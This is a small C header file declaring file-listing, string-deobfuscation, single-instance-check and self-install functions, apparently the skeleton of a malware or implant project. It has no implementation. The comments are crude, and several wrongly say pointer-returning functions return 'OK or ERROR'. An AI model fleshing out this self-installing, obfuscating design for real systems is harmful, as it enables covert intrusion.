#ifndef SYSTEM_UTILS_H
#define SYSTEM_UTILS_H

/**
 * Lists files
 *
 * Given a directory, returns a list of files inside it
 *
 * Returns - OK or ERROR
*/
char **list_files(char *dir_name);

/**
 * Deobfuscates strings
 *
 * Does its shit
 *
 * Returns - OK or ERROR
*/
char *decrypt_string(char *data, size_t len);

/**
 * Checks if its already running
 *
 * Checks for processes called NAME, if there are 2 or
 * more (you + 1) then we stop the program
 *
 * Returns - OK or ERROR
*/
int already_running();

/**
 * Install on the system
 *
 * Installs itself on the system
 *
 * Returns - OK or ERROR
*/
int install();

#endif